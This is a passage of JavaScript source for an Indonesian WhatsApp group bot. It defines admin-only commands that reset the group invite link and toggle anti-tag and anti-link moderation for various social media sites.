◉ _ᴋᴇᴛɪᴋ ".ᴍᴇɴᴜ" / "#ᴍᴇɴᴜ" (ᴜɴᴛᴜᴋ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʙᴏᴛ ʏᴀɴɢ ᴀᴅᴀ ᴅɪ ɢʀᴜᴘ ᴋᴀᴍɪ)_
⊙══════════════════════⊙
*Aʏᴏ ᴊᴏɪɴ ᴅᴀɴ ɴɪᴋᴍᴀᴛɪ ᴋᴇsᴇɴᴀɴɢᴀɴ ʙᴇʀsᴀᴍᴀ ᴅᴇɴɢᴀɴ BOT WʜᴀᴛsAᴘᴘ ᴋᴀᴍɪ ^~^*`)
            }
            break
            case 'revoke':
            case 'buatlinkgc':
            case 'reslink':
            case 'resetlinkgc':
            case 'resetlink':
            case 'revoke': {
            if (isBan) return reply(mess.ban)
                if (!m.isGroup) return reply(mess.group)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins) return reply(mess.admin)
                await tganz.groupRevokeInvite(m.chat)
                    .then(res => {
                        reply(`*Sᴇʟᴇsᴀɪ, Lɪɴᴋ ɢʀᴜᴘ ɪɴɪ ᴛᴇʟᴀʜ ᴅɪᴘᴇʀʙᴀʀᴜɪ ᴏʟᴇʜ Aᴅᴍɪɴ !*`)
                    }).catch((err) => reply('Mᴀᴀғ ᴋᴀᴋ, Tᴇʀᴊᴀᴅɪ ᴍᴀsᴀʟᴀʜ ʏᴀɴɢ ᴛɪᴅᴀᴋ ᴅɪᴋᴇᴛᴀʜᴜɪ. Pᴇᴍʙᴀʀᴜᴀɴ ʟɪɴᴋ ɢʀᴜᴘ ᴅɪʙᴀᴛᴀʟᴋᴀɴ !'))
                   }
                  break
            case 'antitag':
            case 'anti@':
            case 'antitg': {
      if (isBan) return m.reply(mess.ban)
      if (!isCreator) return m.reply(mess.owner)
      if (args[0] === 'on') {
      if (antitags === true) return reply('Sᴜᴅᴀʜ Aᴋᴛɪғ Kᴀᴋ !')
      global.antitags = true
      m.reply('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀɴᴛɪ-ᴛᴀɢ sᴜᴅᴀʜ ᴅɪ ʜɪᴅᴜᴘᴋᴀɴ !')
      } else if (args[0] === 'off') {
      if (antitags === false) reply('Sᴜᴅᴀʜ Oғғ Kᴀᴋ !')
      global.antitags = false
      m.reply('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀɴᴛɪ-ᴛᴀɢ sᴜᴅᴀʜ ᴅɪ ᴍᴀᴛɪᴋᴀɴ !')
      } else {
      let buttonsntilink = [
  { buttonId: `.${command} on`, buttonText: { displayText: '🛡️ ON' }, type: 1 },
  { buttonId: `.${command} off`, buttonText: { displayText: 'OFF 🐾' }, type: 1 }
  ]
  await tganz.sendButtonText(m.chat, buttonsntilink, `*❑ Pɪʟɪʜ ʙᴜᴛᴛᴏɴ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ᴀᴛᴀᴜ ᴍᴇᴍᴀᴛɪᴋᴀɴ ғɪᴛᴜʀ ${command} !*`, footer_text, m)
  }
  }
       break
            case 'antilink': {
            if (isBan) return reply(mess.ban)
                if (!m.isGroup) return reply(mess.group)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins) return reply(mess.admin)
                if (args[0] === "on") {
if (db.data.chats[m.chat].antilink) return reply('Sᴜᴅᴀʜ Aᴋᴛɪғ Kᴀᴋ !')
db.data.chats[m.chat].antilink = true
reply('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ sᴜᴅᴀʜ ᴅɪ ʜɪᴅᴜᴘᴋᴀɴ !')
var groupe = await tganz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
tganz.sendMessage(from, {text: `\`\`\`             「 ! PERINGATAN ! 」\`\`\`\n\n*⫹⫺ Fɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ sᴜᴅᴀʜ ᴅɪ ᴀᴋᴛɪғᴋᴀɴ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ғɪᴛᴜʀ ɪɴɪ ᴀᴋᴛɪғ ᴊɪᴋᴀ ᴍᴇᴍʙᴇʀ ᴍᴇɴɢɪʀɪᴍ ʟɪɴᴋ ɢʀᴜᴘ ʟᴀɪɴ ᴋᴇ ɢʀᴜᴘ ɪɴɪ. ᴊɪᴋᴀ ᴍᴇᴍʙᴇʀ ᴍᴇʟᴀɴɢɢᴀʀ ᴀᴛᴜʀᴀɴ ɪɴɪ ᴀᴋᴀɴ ᴛᴇʀᴋᴇɴᴀ sᴀɴᴋsɪ ʙᴇʀᴜᴘᴀ ᴅɪ ᴋɪᴄᴋ ᴅᴀʀɪ ɢʀᴜᴘ ɪɴɪ !!!*`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antilink) return reply('Sᴜᴅᴀʜ Oғғ Kᴀᴋ !')
db.data.chats[m.chat].antilink = false
reply('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ sᴜᴅᴀʜ ᴅɪ ᴍᴀᴛɪᴋᴀɴ !')
} else {
  let buttonsntilink = [
  { buttonId: `.${command} on`, buttonText: { displayText: '🛡️ ON' }, type: 1 },
  { buttonId: `.${command} off`, buttonText: { displayText: 'OFF 🐾' }, type: 1 }
  ]
  await tganz.sendButtonText(m.chat, buttonsntilink, `*❑ Pɪʟɪʜ ʙᴜᴛᴛᴏɴ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ᴀᴛᴀᴜ ᴍᴇᴍᴀᴛɪᴋᴀɴ ғɪᴛᴜʀ ${command} !*`, footer_text, m)
  }
  }
     break
            case 'antilinkall': {
       if (isBan) return reply(mess.ban)
 		   if (!m.isGroup) return reply(mess.group)
       if (!isBotAdmins) return reply(mess.botAdmin)
       if (!isAdmins) return reply(mess.admin)
							if (args[0] === "on") {
if (db.data.chats[m.chat].antilinkall) return reply('Sᴜᴅᴀʜ Aᴋᴛɪғ Kᴀᴋ !')
db.data.chats[m.chat].antilinkall = true
reply('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋᴀʟʟ sᴜᴅᴀʜ ᴅɪ ʜɪᴅᴜᴘᴋᴀɴ !')
var groupe = await tganz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
tganz.sendMessage(from, {text: `\`\`\`             「 ! PERINGATAN ! 」\`\`\`\n\n*⫹⫺ Fɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋᴀʟʟ sᴜᴅᴀʜ ᴅɪ ᴀᴋᴛɪғᴋᴀɴ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ғɪᴛᴜʀ ɪɴɪ ᴀᴋᴛɪғ ᴊɪᴋᴀ ᴍᴇᴍʙᴇʀ ᴍᴇɴɢɪʀɪᴍ ʟɪɴᴋ ᴍᴇᴅɪᴀ sᴏsɪᴀʟ ʟᴀɪɴ ᴋᴇ ɢʀᴜᴘ ɪɴɪ. ᴊɪᴋᴀ ᴍᴇᴍʙᴇʀ ᴍᴇʟᴀɴɢɢᴀʀ ᴀᴛᴜʀᴀɴ ɪɴɪ ᴀᴋᴀɴ ᴛᴇʀᴋᴇɴᴀ sᴀɴᴋsɪ ʙᴇʀᴜᴘᴀ ᴅɪ ᴋɪᴄᴋ ᴅᴀʀɪ ɢʀᴜᴘ ɪɴɪ !!!*`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antilinkall) return reply('Sᴜᴅᴀʜ Oғғ Kᴀᴋ !')
db.data.chats[m.chat].antilinkall = false
reply('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋᴀʟʟ sᴜᴅᴀʜ ᴅɪ ᴍᴀᴛɪᴋᴀɴ !')
} else {
  let buttonsntilink = [
  { buttonId: `.${command} on`, buttonText: { displayText: '🛡️ ON' }, type: 1 },
  { buttonId: `.${command} off`, buttonText: { displayText: 'OFF 🐾' }, type: 1 }
  ]
  await tganz.sendButtonText(m.chat, buttonsntilink, `*❑ Pɪʟɪʜ ʙᴜᴛᴛᴏɴ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ᴀᴛᴀᴜ ᴍᴇᴍᴀᴛɪᴋᴀɴ ғɪᴛᴜʀ ${command} !*`, footer_text, m)
  }
  }
  break
  case 'antilinkwame':
  case 'antiwame': {
   if (isBan) return reply(mess.ban)
if (!m.isGroup) return replay(mess.group)
if (!isBotAdmins) return replay(mess.botAdmin)
if (!isAdmins && !isCreator) return replay(mess.admin)
if (args[0] === "on") {
if (db.data.chats[m.chat].antiwame) return replay('Sᴜᴅᴀʜ Aᴋᴛɪғ Kᴀᴋ !')
db.data.chats[m.chat].antiwame = true
replay('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀɴᴛɪᴡᴀᴍᴇ sᴜᴅᴀʜ ᴅɪ ʜɪᴅᴜᴘᴋᴀɴ !')
var groupe = await tganz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
tganz.sendMessage(from, {text: `\`\`\`             「 ! PERINGATAN ! 」\`\`\`\n\n*⫹⫺ Fɪᴛᴜʀ ᴀɴᴛɪᴡᴀᴍᴇ sᴜᴅᴀʜ ᴅɪ ᴀᴋᴛɪғᴋᴀɴ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ғɪᴛᴜʀ ɪɴɪ ᴀᴋᴛɪғ ᴊɪᴋᴀ ᴍᴇᴍʙᴇʀ ᴍᴇɴɢɪʀɪᴍ ʟɪɴᴋ ᴡᴀ.ᴍᴇ ᴋᴇ ɢʀᴜᴘ ɪɴɪ. ᴊɪᴋᴀ ᴍᴇᴍʙᴇʀ ᴍᴇʟᴀɴɢɢᴀʀ ᴀᴛᴜʀᴀɴ ɪɴɪ ᴀᴋᴀɴ ᴛᴇʀᴋᴇɴᴀ sᴀɴᴋsɪ ʙᴇʀᴜᴘᴀ ᴅɪ ᴋɪᴄᴋ ᴅᴀʀɪ ɢʀᴜᴘ ɪɴɪ !!!*`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antiwame) return replay('Sᴜᴅᴀʜ Oғғ Kᴀᴋ !')
db.data.chats[m.chat].antiwame = false
replay('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀɴᴛɪᴡᴀᴍᴇ sᴜᴅᴀʜ ᴅɪ ᴍᴀᴛɪᴋᴀɴ !')
} else {
  let buttonsntwame = [
  { buttonId: `.${command} on`, buttonText: { displayText: '🛡️ ON' }, type: 1 },
  { buttonId: `.${command} off`, buttonText: { displayText: 'OFF 🐾' }, type: 1 }
  ]
  await tganz.sendButtonText(m.chat, buttonsntwame, `*❑ Pɪʟɪʜ ʙᴜᴛᴛᴏɴ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ᴀᴛᴀᴜ ᴍᴇᴍᴀᴛɪᴋᴀɴ ғɪᴛᴜʀ ${command} !*`, footer_text, m)
  }
  }
  break
    case 'antilinkyoutubevideo': case 'antilinkyt': case 'antilinkyoutubevid': case 'antilinkytvid': {
   if (isBan) return reply(mess.ban)
if (!m.isGroup) return replay(mess.group)
if (!isBotAdmins) return replay(mess.botAdmin)
if (!isAdmins && !isCreator) return replay(mess.admin)
if (args[0] === "on") {
if (db.data.chats[m.chat].antilinkvid) return replay('Sᴜᴅᴀʜ Aᴋᴛɪғ Kᴀᴋ !')
db.data.chats[m.chat].antilinkvid = true
replay('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ-ʏᴏᴜᴛᴜʙᴇ sᴜᴅᴀʜ ᴅɪ ʜɪᴅᴜᴘᴋᴀɴ !')
var groupe = await tganz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
tganz.sendMessage(from, {text: `\`\`\`             「 ! PERINGATAN ! 」\`\`\`\n\n*⫹⫺ Fɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ-ʏᴏᴜᴛᴜʙᴇ sᴜᴅᴀʜ ᴅɪ ᴀᴋᴛɪғᴋᴀɴ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ғɪᴛᴜʀ ɪɴɪ ᴀᴋᴛɪғ ᴊɪᴋᴀ ᴍᴇᴍʙᴇʀ ᴍᴇɴɢɪʀɪᴍ ʟɪɴᴋ ᴠɪᴅᴇᴏ ʏᴏᴜᴛᴜʙᴇ ᴋᴇ ɢʀᴜᴘ ɪɴɪ. ᴊɪᴋᴀ ᴍᴇᴍʙᴇʀ ᴍᴇʟᴀɴɢɢᴀʀ ᴀᴛᴜʀᴀɴ ɪɴɪ ᴀᴋᴀɴ ᴛᴇʀᴋᴇɴᴀ sᴀɴᴋsɪ ʙᴇʀᴜᴘᴀ ᴅɪ ᴋɪᴄᴋ ᴅᴀʀɪ ɢʀᴜᴘ ɪɴɪ !!!*`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antilinkvid) return replay('Sᴜᴅᴀʜ Oғғ Kᴀᴋ !')
db.data.chats[m.chat].antilinkvid = false
replay('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ-ʏᴏᴜᴛᴜʙᴇ sᴜᴅᴀʜ ᴅɪ ᴍᴀᴛɪᴋᴀɴ !')
} else {
  let buttonsntilink = [
  { buttonId: `.${command} on`, buttonText: { displayText: '🛡️ ON' }, type: 1 },
  { buttonId: `.${command} off`, buttonText: { displayText: 'OFF 🐾' }, type: 1 }
  ]
  await tganz.sendButtonText(m.chat, buttonsntilink, `*❑ Pɪʟɪʜ ʙᴜᴛᴛᴏɴ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ᴀᴛᴀᴜ ᴍᴇᴍᴀᴛɪᴋᴀɴ ғɪᴛᴜʀ ${command} !*`, footer_text, m)
  }
  }
  break
    case 'antilinkyoutubech': case 'antilinkchannel': case 'antilinkyoutubechannel': case 'antilinkytch': {
   if (isBan) return reply(mess.ban)
if (!m.isGroup) return replay(mess.group)
if (!isBotAdmins) return replay(mess.botAdmin)
if (!isAdmins && !isCreator) return replay(mess.admin)
if (args[0] === "on") {
if (db.data.chats[m.chat].antilinkch) return replay('Sᴜᴅᴀʜ Aᴋᴛɪғ Kᴀᴋ !')
db.data.chats[m.chat].antilinkch = true
replay('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ-ᴄʜᴀɴɴᴇʟ sᴜᴅᴀʜ ᴅɪ ʜɪᴅᴜᴘᴋᴀɴ !')
var groupe = await tganz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
tganz.sendMessage(from, {text: `\`\`\`             「 ! PERINGATAN ! 」\`\`\`\n\n*⫹⫺ Fɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ-ᴄʜᴀɴɴᴇʟ sᴜᴅᴀʜ ᴅɪ ᴀᴋᴛɪғᴋᴀɴ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ғɪᴛᴜʀ ɪɴɪ ᴀᴋᴛɪғ ᴊɪᴋᴀ ᴍᴇᴍʙᴇʀ ᴍᴇɴɢɪʀɪᴍ ʟɪɴᴋ ᴄʜᴀɴɴᴇʟ ʏᴏᴜᴛᴜʙᴇ ᴋᴇ ɢʀᴜᴘ ɪɴɪ. ᴊɪᴋᴀ ᴍᴇᴍʙᴇʀ ᴍᴇʟᴀɴɢɢᴀʀ ᴀᴛᴜʀᴀɴ ɪɴɪ ᴀᴋᴀɴ ᴛᴇʀᴋᴇɴᴀ sᴀɴᴋsɪ ʙᴇʀᴜᴘᴀ ᴅɪ ᴋɪᴄᴋ ᴅᴀʀɪ ɢʀᴜᴘ ɪɴɪ !!!*`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antilinkch) return replay('Sᴜᴅᴀʜ Oғғ Kᴀᴋ !')
db.data.chats[m.chat].antilinkch = false
replay('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ-ᴄʜᴀɴɴᴇʟ sᴜᴅᴀʜ ᴅɪ ᴍᴀᴛɪᴋᴀɴ !')
} else {
  let buttonsntilink = [
  { buttonId: `.${command} on`, buttonText: { displayText: '🛡️ ON' }, type: 1 },
  { buttonId: `.${command} off`, buttonText: { displayText: 'OFF 🐾' }, type: 1 }
  ]
  await tganz.sendButtonText(m.chat, buttonsntilink, `*❑ Pɪʟɪʜ ʙᴜᴛᴛᴏɴ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ᴀᴛᴀᴜ ᴍᴇᴍᴀᴛɪᴋᴀɴ ғɪᴛᴜʀ ${command} !*`, footer_text, m)
  }
  }
  break
      case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
   if (isBan) return reply(mess.ban)	 			
if (!m.isGroup) return replay(mess.group)
if (!isBotAdmins) return replay(mess.botAdmin)
if (!isAdmins && !isCreator) return replay(mess.admin)
if (args[0] === "on") {
if (db.data.chats[m.chat].antilinkig) return replay('Sᴜᴅᴀʜ Aᴋᴛɪғ Kᴀᴋ !')
db.data.chats[m.chat].antilinkig = true
replay('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ-Iɴsᴛᴀɢʀᴀᴍ sᴜᴅᴀʜ ᴅɪ ʜɪᴅᴜᴘᴋᴀɴ !')
var groupe = await tganz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
tganz.sendMessage(from, {text: `\`\`\`             「 ! PERINGATAN ! 」\`\`\`\n\n*⫹⫺ Fɪᴛᴜʀ ᴀɴᴛɪ-ɪɴsᴛᴀɢʀᴀᴍ sᴜᴅᴀʜ ᴅɪ ᴀᴋᴛɪғᴋᴀɴ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ғɪᴛᴜʀ ɪɴɪ ᴀᴋᴛɪғ ᴊɪᴋᴀ ᴍᴇᴍʙᴇʀ ᴍᴇɴɢɪʀɪᴍ ʟɪɴᴋ ɪɴsᴛᴀɢʀᴀᴍ ᴋᴇ ɢʀᴜᴘ ɪɴɪ. ᴊɪᴋᴀ ᴍᴇᴍʙᴇʀ ᴍᴇʟᴀɴɢɢᴀʀ ᴀᴛᴜʀᴀɴ ɪɴɪ ᴀᴋᴀɴ ᴛᴇʀᴋᴇɴᴀ sᴀɴᴋsɪ ʙᴇʀᴜᴘᴀ ᴅɪ ᴋɪᴄᴋ ᴅᴀʀɪ ɢʀᴜᴘ ɪɴɪ !!!*`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antilinkig) return replay('Sᴜᴅᴀʜ Oғғ Kᴀᴋ !')
db.data.chats[m.chat].antilinkig = false
replay('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ-Iɴsᴛᴀɢʀᴀᴍ sᴜᴅᴀʜ ᴅɪ ᴍᴀᴛɪᴋᴀɴ !')
} else {
  let buttonsntilink = [
  { buttonId: `.${command} on`, buttonText: { displayText: '🛡️ ON' }, type: 1 },
  { buttonId: `.${command} off`, buttonText: { displayText: 'OFF 🐾' }, type: 1 }
  ]
  await tganz.sendButtonText(m.chat, buttonsntilink, `*❑ Pɪʟɪʜ ʙᴜᴛᴛᴏɴ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ᴀᴛᴀᴜ ᴍᴇᴍᴀᴛɪᴋᴀɴ ғɪᴛᴜʀ ${command} !*`, footer_text, m)
  }
  }
  break
        case 'antilinkfacebook': case 'antilinkfb': {
   if (isBan) return reply(mess.ban)
if (!m.isGroup) return replay(mess.group)
if (!isBotAdmins) return replay(mess.botAdmin)
if (!isAdmins && !isCreator) return replay(mess.admin)
if (args[0] === "on") {
if (db.data.chats[m.chat].antilinkfb) return replay('Sᴜᴅᴀʜ Aᴋᴛɪғ Kᴀᴋ !')
db.data.chats[m.chat].antilinkfb = true
replay('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ-ғᴀᴄᴇʙᴏᴏᴋ sᴜᴅᴀʜ ᴅɪ ʜɪᴅᴜᴘᴋᴀɴ !')
var groupe = await tganz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
tganz.sendMessage(from, {text: `\`\`\`             「 ! PERINGATAN ! 」\`\`\`\n\n*⫹⫺ Fɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ-ғᴀᴄᴇʙᴏᴏᴋ sᴜᴅᴀʜ ᴅɪ ᴀᴋᴛɪғᴋᴀɴ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ғɪᴛᴜʀ ɪɴɪ ᴀᴋᴛɪғ ᴊɪᴋᴀ ᴍᴇᴍʙᴇʀ ᴍᴇɴɢɪʀɪᴍ ʟɪɴᴋ ғᴀᴄᴇʙᴏᴏᴋ ᴋᴇ ɢʀᴜᴘ ɪɴɪ. ᴊɪᴋᴀ ᴍᴇᴍʙᴇʀ ᴍᴇʟᴀɴɢɢᴀʀ ᴀᴛᴜʀᴀɴ ɪɴɪ ᴀᴋᴀɴ ᴛᴇʀᴋᴇɴᴀ sᴀɴᴋsɪ ʙᴇʀᴜᴘᴀ ᴅɪ ᴋɪᴄᴋ ᴅᴀʀɪ ɢʀᴜᴘ ɪɴɪ !!!*`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antilinkfb) return replay('Sᴜᴅᴀʜ Oғғ Kᴀᴋ !')
db.data.chats[m.chat].antilinkfb = false
replay('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ-ғᴀᴄᴇʙᴏᴏᴋ sᴜᴅᴀʜ ᴅɪ ᴍᴀᴛɪᴋᴀɴ !')
} else {
  let buttonsntilink = [
  { buttonId: `.${command} on`, buttonText: { displayText: '🛡️ ON' }, type: 1 },
  { buttonId: `.${command} off`, buttonText: { displayText: 'OFF 🐾' }, type: 1 }
  ]
  await tganz.sendButtonText(m.chat, buttonsntilink, `*❑ Pɪʟɪʜ ʙᴜᴛᴛᴏɴ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ᴀᴛᴀᴜ ᴍᴇᴍᴀᴛɪᴋᴀɴ ғɪᴛᴜʀ ${command} !*`, footer_text, m)
  }
  }
  break
          case 'antilinktelegram': case 'antilinktg': {
   if (isBan) return reply(mess.ban)
if (!m.isGroup) return replay(mess.group)
if (!isBotAdmins) return replay(mess.botAdmin)
if (!isAdmins && !isCreator) return replay(mess.admin)
if (args[0] === "on") {
if (db.data.chats[m.chat].antilinktg) return replay('Sᴜᴅᴀʜ Aᴋᴛɪғ Kᴀᴋ !')
db.data.chats[m.chat].antilinktg = true
replay('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ-ᴛᴇʟᴇɢʀᴀᴍ sᴜᴅᴀʜ ᴅɪ ʜɪᴅᴜᴘᴋᴀɴ !')
var groupe = await tganz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
tganz.sendMessage(from, {text: `\`\`\`             「 ! PERINGATAN ! 」\`\`\`\n\n*⫹⫺ Fɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ-ᴛᴇʟᴇɢʀᴀᴍ sᴜᴅᴀʜ ᴅɪ ᴀᴋᴛɪғᴋᴀɴ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ғɪᴛᴜʀ ɪɴɪ ᴀᴋᴛɪғ ᴊɪᴋᴀ ᴍᴇᴍʙᴇʀ ᴍᴇɴɢɪʀɪᴍ ʟɪɴᴋ ᴛᴇʟᴇɢʀᴀᴍ ᴋᴇ ɢʀᴜᴘ ɪɴɪ. ᴊɪᴋᴀ ᴍᴇᴍʙᴇʀ ᴍᴇʟᴀɴɢɢᴀʀ ᴀᴛᴜʀᴀɴ ɪɴɪ ᴀᴋᴀɴ ᴛᴇʀᴋᴇɴᴀ sᴀɴᴋsɪ ʙᴇʀᴜᴘᴀ ᴅɪ ᴋɪᴄᴋ ᴅᴀʀɪ ɢʀᴜᴘ ɪɴɪ !!!*`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antilinktg) return replay('Sᴜᴅᴀʜ Oғғ Kᴀᴋ !')
db.data.chats[m.chat].antilinktg = false
replay('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ-ᴛᴇʟᴇɢʀᴀᴍ sᴜᴅᴀʜ ᴅɪ ᴍᴀᴛɪᴋᴀɴ !')
} else {
  let buttonsntilink = [
  { buttonId: `.${command} on`, buttonText: { displayText: '🛡️ ON' }, type: 1 },
  { buttonId: `.${command} off`, buttonText: { displayText: 'OFF 🐾' }, type: 1 }
  ]
  await tganz.sendButtonText(m.chat, buttonsntilink, `*❑ Pɪʟɪʜ ʙᴜᴛᴛᴏɴ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴋᴛɪғᴋᴀɴ ᴀᴛᴀᴜ ᴍᴇᴍᴀᴛɪᴋᴀɴ ғɪᴛᴜʀ ${command} !*`, footer_text, m)
  }
  }
  break
            case 'antilinktiktok': case 'antilinktt': {
   if (isBan) return reply(mess.ban)
if (!m.isGroup) return replay(mess.group)
if (!isBotAdmins) return replay(mess.botAdmin)
if (!isAdmins && !isCreator) return replay(mess.admin)
if (args[0] === "on") {
if (db.data.chats[m.chat].antilinktt) return replay('Sᴜᴅᴀʜ Aᴋᴛɪғ Kᴀᴋ !')
db.data.chats[m.chat].antilinktt = true
replay('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ-ᴛɪᴋᴛᴏᴋ sᴜᴅᴀʜ ᴅɪ ʜɪᴅᴜᴘᴋᴀɴ !')
var groupe = await tganz.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
tganz.sendMessage(from, {text: `\`\`\`             「 ! PERINGATAN ! 」\`\`\`\n\n*⫹⫺ Fɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ-ᴛɪᴋᴛᴏᴋ sᴜᴅᴀʜ ᴅɪ ᴀᴋᴛɪғᴋᴀɴ, Sᴇʙᴀɢᴀɪᴍᴀɴᴀ ғɪᴛᴜʀ ɪɴɪ ᴀᴋᴛɪғ ᴊɪᴋᴀ ᴍᴇᴍʙᴇʀ ᴍᴇɴɢɪʀɪᴍ ʟɪɴᴋ ᴛɪᴋᴛᴏᴋ ᴋᴇ ɢʀᴜᴘ ɪɴɪ. ᴊɪᴋᴀ ᴍᴇᴍʙᴇʀ ᴍᴇʟᴀɴɢɢᴀʀ ᴀᴛᴜʀᴀɴ ɪɴɪ ᴀᴋᴀɴ ᴛᴇʀᴋᴇɴᴀ sᴀɴᴋsɪ ʙᴇʀᴜᴘᴀ ᴅɪ ᴋɪᴄᴋ ᴅᴀʀɪ ɢʀᴜᴘ ɪɴɪ !!!*`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!db.data.chats[m.chat].antilinktt) return replay('Sᴜᴅᴀʜ Oғғ Kᴀᴋ !')
db.data.chats[m.chat].antilinktt = false
replay('Sᴇʟᴇsᴀɪ. Fɪᴛᴜʀ ᴀɴᴛɪʟɪɴᴋ-ᴛɪᴋᴛᴏᴋ sᴜᴅᴀʜ ᴅɪ ᴍᴀᴛɪᴋᴀɴ !')
} else {
  let buttonsntilink = [
  { buttonId: `.${command} on`, buttonText: { displayText: '🛡️ ON' }, type: 1 },
  { buttonId: `.${command} off`, buttonText: { displayText: 'OFF 🐾' }, type: 1 }
  ]
